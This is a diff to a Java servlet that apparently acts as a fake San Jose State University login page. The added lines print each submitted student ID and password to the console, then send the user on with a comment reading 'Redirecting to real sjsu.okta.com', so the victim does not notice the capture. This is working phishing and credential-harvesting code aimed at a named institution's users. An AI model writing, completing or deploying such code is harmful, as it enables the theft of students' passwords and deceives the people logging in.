@@ -20,9 +20,12 @@ public class Servlet extends HttpServlet {
     @Override
     protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
 
-        //Retrieve login info
+        //Retrieve login info from testing.jsp
         String studentID = req.getParameter("identifier");
         String password = req.getParameter("credentials.passcode");
+        
+        System.out.println("studentID: " + studentID);
+        System.out.println("password: " + password);
 
         Bean bean = new Bean(studentID, password);
         int validation = 0;
@@ -32,12 +35,10 @@ public class Servlet extends HttpServlet {
             throw new RuntimeException(e);
         }
 
-        if(validation != 0){
-            req.getRequestDispatcher("https://sjsu.okta.com/app/sanjosestateuniversity_psghcampussolutions_1/exkk56vvg5sVa0tkH0x7/sso/saml");
-        }
-        else {
-            req.getRequestDispatcher("testing.jsp").forward(req, resp);
-        }
+        System.out.println("validation: " + validation);
+        System.out.println("Redirecting to real sjsu.okta.com");
+//        req.getRequestDispatcher("https://sjsu.okta.com/app/sanjosestateuniversity_psghcampussolutions_1/exkk56vvg5sVa0tkH0x7/sso/saml");
+        resp.sendRedirect("https://sjsu.okta.com/app/sanjosestateuniversity_psghcampussolutions_1/exkk56vvg5sVa0tkH0x7/sso/saml");
     }
 
     @Override
